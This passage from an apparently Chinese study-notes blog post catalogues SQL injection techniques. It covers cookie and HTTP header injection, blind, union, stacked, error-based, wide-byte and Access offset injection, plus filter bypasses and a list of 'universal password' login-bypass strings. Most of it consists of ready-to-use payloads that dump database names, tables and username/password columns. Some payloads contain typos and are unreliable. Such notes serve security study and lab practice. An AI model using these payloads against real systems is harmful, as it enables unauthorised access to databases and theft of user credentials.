,1,1))) = 115  or if(1=1, sleep(1), null)  #</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post型盲注通杀payload：</span><br><span class="line"></span><br><span class="line">uname=admin%df&#x27;or()or%200%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><code>③Cookie 注入</code><br>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。有报错信息可以利用报错注入</p><blockquote><p>第一步：寻找参数位置<br>eg：.asp?id&#x3D;xx这样带参数id&#x3D;xx</p><p>第二步：去掉参数，观察参数影响<br>eg：将“id&#x3D;xx”删掉，看页面是否正常，正常，则说明参数不起作用。反之不正常，说明参数在数据传递中启直接作用</p><p>第三步：（先清空网址）输入“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx”));”<br>按Enter键后弹出一个对话框，内容是“id&#x3D;xx”</p><p>然后重新输入原来URL回车</p><p>如果显示正常，说明是用Request(“id”)方式获取数据</p><p>&#x2F;&#x2F;注释</p><p><strong>document.cookie:表示当前浏览器中的cookie变量</strong></p><p><strong>alert（）:表示弹出一个对话框</strong></p><p><strong>escape():对字符串进行编码</strong></p><p>第四步：判断是否存在漏洞<br>将SQL判断语句带入，并重复第三步</p><p>①“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx and 1&#x3D;1”));”</p><p>②“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx and 1&#x3D;2”));”。</p><p>若①正常，②不正常，则说明存在注入漏洞，并可以进行cookie注入</p><p>第五步：cookie注入<br>构造cookie注入payload</p><p>javascript:alert(document.cookie&#x3D;”smallclass&#x3D;”+escape(“xx order by 2”));</p><p>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“284 union select 1,…… from xx”));</p></blockquote><p>还有结合exists</p><ul><li>括号中的子查询并不会返回具体的查询到的数据，只是会返回true或者false，如果外层sql的字段在子查询中存在则返回true，不存在则返回false</li><li>即使子查询的查询结果是null，只要是对应的字段是存在的，子查询中则返回true</li></ul><blockquote><p>document.cookie&#x3D;”id &#x3D; “ + escape(“105 and exists(select * from 表名)”)</p></blockquote><p>也可用报错注入</p><p><code>④HTTP 头部注入</code><br>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:.........&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure><p><code>User-Agent注入</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:1&#x27; and updatexml(1,concat(0xx5e,version(),0x5e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><code>Referer 注入</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x5e,version(),0x5e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><code>X-Forwarded-For注入</code><br>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br>如果系统采用了服务器后端获取 X-Forwarded-For数据，如：利用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String ip = request.getHeader(&quot;X-Forwarded-For&quot;)</span><br></pre></td></tr></table></figure><p>进行获取ip，攻击者可以通过X-Forwarded-For请求头信息就行伪造ip，当然了这个ip<br>也可以是一些注入语句，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For：1 and if(now()=sysdate(),sleep(6),0)--</span><br><span class="line">String sql = &quot;select * from table where ip = &#x27;&quot;+ip+&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>构造X-Forwoarded-For头进行测试，http响应出现变化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: -1&#x27; OR 3*2*1=6 AND 000958=000958--</span><br><span class="line">X-Forwarded-For: -1&#x27; OR 3*2*1=6 AND 000958=000957--</span><br></pre></td></tr></table></figure><p><code>⑤Request方式注入</code><br>概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是：<br><code>$_REQUEST（获取GET/POST/COOKIE）COOKIE在新版本已经无法获取了 $_POST（获取POST传参） $_GET（获取GET传参） $_COOKIE（获取COOKIE传参） $_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）</code></p><h4 id="3-按照执行效果来分类"><a href="#3-按照执行效果来分类" class="headerlink" title="3.按照执行效果来分类"></a>3.按照执行效果来分类</h4><p><code>①基于布尔的盲注</code></p><p>即可以根据返回页面判断条件真假的注入。盲注是注入的一种，指的是在不知道<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE&spm=1001.2101.3001.7020">数据</a>库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure><p>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p><p>报错型：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p><p><code>②基于时间的盲注，</code></p><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><p>在SQL注入过程中，无论注入是否成功，页面完全没有变化。此时只能通过使用数据库的延时函数来判断注入点一般采用响应时间上的差异来判断是否存在SQL注入，即基于时间型的SQL盲注</p><p><code>③基于报错注入，</code></p><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p><p>updatexml报错注入</p><p>concat+rand()+group_by()导致主键重复</p><p><code>④联合查询注入</code></p><p>可以使用union的情况下的注入</p><p><code>⑤二次注入</code></p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入</p><p><code>⑥堆查询注入</code></p><p>可以同时执行多条语句的执行时的注入。</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束,堆叠注入可以执行任何人sql语句。但是当API或数据库引擎的不支持，堆叠注入就不能进行啦</p><h4 id="4-其他类型注入"><a href="#4-其他类型注入" class="headerlink" title="4.其他类型注入"></a>4.其他类型注入</h4><p><code>①Access偏移注入</code></p><p><code>②MongoDB 注入</code></p><p><code>③LDAP注入</code></p><p><code>④JSON注入</code></p><p><code>⑤DNSlog注入</code></p><p><code>⑥宽字节注入</code></p><p>具体怎么注入 后面学了在写</p><h3 id="联合攻击"><a href="#联合攻击" class="headerlink" title="联合攻击"></a>联合攻击</h3><p>通过union来进行攻击</p><p>‘union select 1,2,3–+ </p><p>‘union select 1,2,database()–+</p><p>‘union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+</p><p>‘union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’xxx’–+</p><p>‘union select 1,2,group_concat(a,b,c) from ‘xxx’–+</p><h3 id="堆叠攻击"><a href="#堆叠攻击" class="headerlink" title="堆叠攻击"></a>堆叠攻击</h3><p>在一处sql注入点同时执行两种命令   比如删库</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>用于无回显</p><p>判断库名长度–&gt;判断具体字符–&gt;判断表名长度–&gt;判断具体字符–&gt;判断字段名长度–&gt;查字段</p><p>主要会用：</p><p>ascii（）  查ascii码</p><p>length（）返回字符串长度</p><p>substr（）截取字符串</p><p>‘and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length(database())&gt;5--+</span><br><span class="line">将&gt;号掉个方向看结果有没有变化，来判断布尔盲注有没有用，后面就继续猜表名，列名，然后内容。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ttp://127.0.0.1/Less-8/?id=1&#x27;and (length(database()))&gt;10 --+</span><br><span class="line">and select length(database())&gt;n //判断数据库名长度</span><br><span class="line">and ascii(substr(database(),m,1))&gt;n //截取数据库名第m个字符并转换成ascii码 判断具体值</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>跟布尔盲注一样</p><p>主要用：</p><p>sleep（）  使网页回复变慢</p><p>and   使条件同时成立</p><p>主要通过网页回复时间来判断前面的sql语句是否正确  慢就对</p><p>‘ and length(database())&#x3D;8 and sleep(10)–+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name from product where id=1 and sleep(2)</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>通过网页的报错获取目标信息</p><p>主要用：</p><p>floor（X） 返回一个效应X的值</p><p>extractvalue()   当xpath_string出现格式错误时，mysql爆出xpath语法错误</p><p>updatexml()    跟extractvalue()差不多</p><h6 id="其他用到的函数："><a href="#其他用到的函数：" class="headerlink" title="其他用到的函数："></a>其他用到的函数：</h6><p>group_concat      将数据连接起来</p><p>limit（x，y）   从第x开始取，取y个</p><p>mid       与substr 一样</p><p>ord      与ascii一样</p><p>left       从左向右取</p><p>into outfile   把xxxx写入指定文件中</p><h3 id="万用密码"><a href="#万用密码" class="headerlink" title="万用密码"></a>万用密码</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>万能密码利用的原理就是在后台登陆页面没有对用户输入的内容进行验证，此时程序所用用户输入的数据都合法的，所以这个时候无论是合法的管理员还是非法的入侵者所输入的数据都是被信任的，非法入侵者正是利用这一特点来进行非法登录的</p><p>账号：djlfjdslajdfj（随意输入）<br>密码：1‘or’1’&#x3D;‘1</p><ol><li>用户进行用户名和密码验证时，网站需要查询数据库。查询数据库就是执行SQL语句。用户登录时，后台执行的数据库查询操作（SQL语句）是：【Select user_id,user_type,email From users Where user_id&#x3D;’用户名’ And password&#x3D;’密码’】。</li><li>由于网站后台在进行数据库查询的时候没有对单引号进行过滤，当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为：【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’or’1’】。</li><li>由于SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】，【and】优先于【or】，且适用传递性。因此，此SQL语句在后台解析时，分成两句：【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’】和【’1’】，两句bool值进行逻辑or运算，恒为TRUE。SQL语句的查询结果为TRUE，就意味着认证成功，也可以登录到系统中。<br>输入用户名【admin】，密码【2’or’1】，即可登录成功。</li><li>在网站开发中也有些人是这样做的，T_users是表名，username是数据库中字段名，name和pwd是变量。<br>“select * form T_users where username&#x3D;’ “+ name +” ’ “+” and password&#x3D;’ “+ pwd +” ’ “;<br>如果变量name赋值为root，pwd变量赋值为root的话，这根本不会有什么问题，和上面一模一样。<br>即等价于”select * from T_users where username&#x3D; ‘root’ and password&#x3D; ‘root’ “<br>但是如果变量name赋值：随意输入，而pwd被赋值 1 or 1&#x3D;1 ，<br>那么整个语句就变成了这个样子：<br>“select from T_users where username&#x3D;‘adsfafsf’ and password&#x3D;‘1 or 1&#x3D;1’ “<br>可以看出，此时整个查询语句返回值始终为true.</li></ol><h4 id="常用万用密码"><a href="#常用万用密码" class="headerlink" title="常用万用密码"></a>常用万用密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">2： &#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">3：or 1=1--</span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line">7：&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">11：1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">12：1 or &#x27;1&#x27;=&#x27;1&#x27; or 1=1</span><br><span class="line">13： &#x27;OR 1=1%00</span><br><span class="line">14:&quot;)or(“a”=&quot;a</span><br><span class="line">15:‘or 1=1–</span><br><span class="line">16:“or 1=1–</span><br><span class="line">17:&#x27;or”=&#x27;</span><br><span class="line">18:&#x27;or 1=1/</span><br><span class="line">19:admin’ or 1=1/*</span><br></pre></td></tr></table></figure><h3 id="简单Bypass-绕过"><a href="#简单Bypass-绕过" class="headerlink" title="简单Bypass 绕过"></a>简单Bypass 绕过</h3><p>用编码改写特殊字符</p><p>关键字过滤：双写  大小写  替换</p><p>特殊字符过滤： 空格：内联取代  注释取代</p><p>​                           逗号：from for</p><p>参数混淆：加入更多的混淆参数，并改变注入位置</p><p>​                   用无效参数</p><p>​                   溢出</p><p>宽字节绕过</p><p>拼接字符串：’    concat     concat_ws     group_concat</p><p>函数替换</p><p>不能使用group_concat函数时，使limit语句来限制查询结果的列数</p><p>一、通过注释符绕过<br>注释符 # &#x2F;&#x2F;<br>通过在关键词的中间加入注释符，使关键词不被识别<br>如 select 改为 se&#x2F;&#x2F;lect</p><p>二、通过&lt;&gt;绕过<br>如 select 改为 sel&lt;&gt;ect</p><p>三、通过改变大小写绕过<br>四、如果and or被过滤<br>可以将and 用&amp;&amp; 替换<br>or 用 || 替换</p><p>五、通过重复关键词绕过<br>六、通过url编码绕过<br>七、等价函数与命令绕过<br>函数或变量</p><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &gt;benchmark()<br>concat_ws()&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p><p>过滤逗号 join   </p><p>limit后面过滤逗号 from to</p><p>后面会写一个详细的整理清楚的bypass，这个写的太乱了</p><hr><h1 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h1><p> <code>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。    报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</code></p><h2 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h2><p>Updatexml(): 函数是MYSQL对XML文档数据进行查询和修改的XPATH函数</p><p>extractvalue(): 函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数</p><p>floor(): MYSQL中用于取整的函数</p><p>其他用于报错的函数还有10+种，但常用的就这三个</p><p>对于Updatexml()和extractvalue()我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错</p><h3 id="Updatexml"><a href="#Updatexml" class="headerlink" title="Updatexml()"></a>Updatexml()</h3><p>Updatexml(xml_document,XPath_string,new_value)</p><p>它是一个内容替换函数，主要针对XML数据</p><p>第一个参数：是string格式，为xml文档对象名称，中文为Doc</p><p>第二个参数：XPath格式的字符串，用于匹配（与正则语法不同）</p><p>第三个参数：替换查找到的符合条件的数据</p><p>使用</p><blockquote><p>查询当前数据库的用户信息以及数据库版本信息:</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) –+</p><p>获取当前数据库下数据表信息：</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),3) –+</p><p>获取users表名的列名信息：</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x7e),3) –+</p><p>获取users数据表下username、password两列名的用户字段信息:</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) –+</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) –+</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br><span class="line">链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br><span class="line">爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1</span><br></pre></td></tr></table></figure><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>extractvalue(XML_document,XPath_string)</p><p>第一个参数：String格式，为XML文档对象名称</p><p>第二个参数：Xpath格式字符串</p><p>concat:返回结果为连接参数产生的字符串</p><p>使用</p><blockquote><p>获取当前是数据库名称及使用mysql数据库的版本信息：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) –+</p><p>获取当前位置所用数据库的位置：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,@@datadir,0x7e)) –+</p><p>获取表名：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) –+</p><p>获取users表的列名：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x7e)) –+</p><p>获取对应的列名的信息(username&#x2F;password):</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) –+</p></blockquote><h3 id="其他注入函数"><a href="#其他注入函数" class="headerlink" title="其他注入函数"></a>其他注入函数</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错：”DOUBLE value is out of range”</p><p>?id&#x3D;1” and exp(~(select * from (select user())a)) –+<br>先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a</p><p>然后在查询select * from a 查询a，将结果集a全部查询出来</p><p>查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成BigInt大数据类型溢出，就会报错</p><p>使用</p><blockquote><p>获取表名：</p><p>?id&#x3D;1” and exp(~(select * from (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)a)) –+<br>获取列名：</p><p>?id&#x3D;1” and exp(~(select * from (select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1)a)) –+<br>获取列名对应信息：</p><p>?id&#x3D;1” and exp(~(select * from(select username from ‘users’ limit 0,1))) –+</p></blockquote><p><strong>适用mysql数据库版本是：5.5.5~5.5.49</strong></p><p>pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入</p><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()</p><p>利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p><p>相关函数</p><p> rand()：是一个随机函数，通过一个固定的随机数的种子0之后，产生大于等于0小于1的伪随机序列</p><p>floor()：函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。</p><p>group by：进行分组排序相同名字合并</p><p>count()：对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量</p><p>使用：</p><blockquote><p>?id&#x3D;1” and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)–+</p><p>and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p></blockquote><h4 id="各种报错注入的万能语句"><a href="#各种报错注入的万能语句" class="headerlink" title="各种报错注入的万能语句"></a>各种报错注入的万能语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过floor报错,注入语句如下:</span><br><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过ExtractValue报错,注入语句如下:</span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过UpdateXml报错,注入语句如下:</span><br><span class="line">and 1=(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过NAME_CONST报错,注入语句如下:</span><br><span class="line">and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过join报错,注入语句如下:</span><br><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过exp报错,注入语句如下:</span><br><span class="line">and exp(~(select * from (select user () ) a) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过GeometryCollection()报错,注入语句如下:</span><br><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过polygon ()报错,注入语句如下:</span><br><span class="line">and polygon (()select * from(select user ())a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multipoint ()报错,注入语句如下:</span><br><span class="line">and multipoint (()select * from(select user() )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multlinestring ()报错,注入语句如下:</span><br><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multpolygon ()报错,注入语句如下:</span><br><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过linestring ()报错,注入语句如下:</span><br><span class="line">and linestring (()select * from(select user() )a)b );</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="前置-1"><a href="#前置-1" class="headerlink" title="前置"></a>前置</h2><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p><p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p><p>两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。</p><p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p><p>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</p><h2 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h2><p>要有宽字节注入漏洞</p><p>1、首先要满足目标程序使用双&#x2F;多字节字符集进行解析</p><p>2、其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\。</p><h2 id="理解与使用"><a href="#理解与使用" class="headerlink" title="理解与使用"></a>理解与使用</h2><p>宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象</p><p>我们这里的宽字节注入是利用的MySQL的一个特性，<strong>MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字</strong>（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当提交</span><br><span class="line">id=1&#x27; and 1=1%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">时，MySQL的运行的SQL语句为</span><br><span class="line">select * from user where  id =&#x27;1\&#x27; and 1=1#&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很明显这是没有注入成功的，而当我们提交</span><br><span class="line">id=1%df&#x27; and 1=1%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL的运行的SQL语句为</span><br><span class="line">select * from user where id =&#x27;1運&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure><p>也就是说%df-&gt;0xdf与\的十六进制编码拼接，被识别成’運’</p><p>有宽字节注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; or 1=1# 直接遍历</span><br></pre></td></tr></table></figure><p>宽字节注入常用于绕过一些转义的函数</p><p>当php,ini配置文件中添加<strong>magic_quotes_gpc&#x3D;on</strong> 或者使用使用一些转义函数，比如：addslashes(adf)和mysal_real_escape_string,他们会转义单引号、双引号、反斜杠与NUL（NULL字符），转义的方法是在符号前加\ 使SQL注入语句失效</p><p>此时可以用宽字节注入来绕过或不使用他们转义的符号来注入</p><h1 id="偏移量注入"><a href="#偏移量注入" class="headerlink" title="偏移量注入"></a>偏移量注入</h1><h2 id="前置-2"><a href="#前置-2" class="headerlink" title="前置"></a>前置</h2><p>偏移注入是access比较独有的一种注入手段</p><p>一般用于在猜出了表名但是没有猜出列名的情况下使用（无列名注入）</p><p>根据一个较多字段的表对一个少字段的表进行偏移注入</p><p><strong>原理：</strong>借用数据库的自连接查询（inner join）让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示。</p><p>通过我们补充的123，使两张表对齐，并通过移动*的位置，使我们需要的数据与页面所展示的数据对齐，进而将我们需要的数据展示出来</p><p><strong>用处（使用场景）：</strong>access偏移注入是解决一些注入不出来列表的时候，同时要求支持union select，列名足够多，需要知道表名。</p><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。</p><p>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p><p>像Sqlmap之类的工具实际上是爆破字段的名字，但是如果字段名称比较奇葩，就无可奈何了</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>知道表名,但不知道列名</li><li>支持联合查询</li><li>联合查询前面的查询语句列数要比注入的union后面的查询的列数要多</li></ul><h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p>1、判断注入点</p><p>2、查询字段个数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 order by 22 正常</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 order by 23 错误</span><br></pre></td></tr></table></figure><p>3、爆出显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br></pre></td></tr></table></figure><p>4、判断表内存在的字段个数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin 错误</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,* from admin 错误</span><br><span class="line"></span><br><span class="line">直到</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</span><br></pre></td></tr></table></figure><p>所以admin表下有6个字段</p><p>6+16&#x3D;22</p><p><code>在中间使用*时，要用表名.*  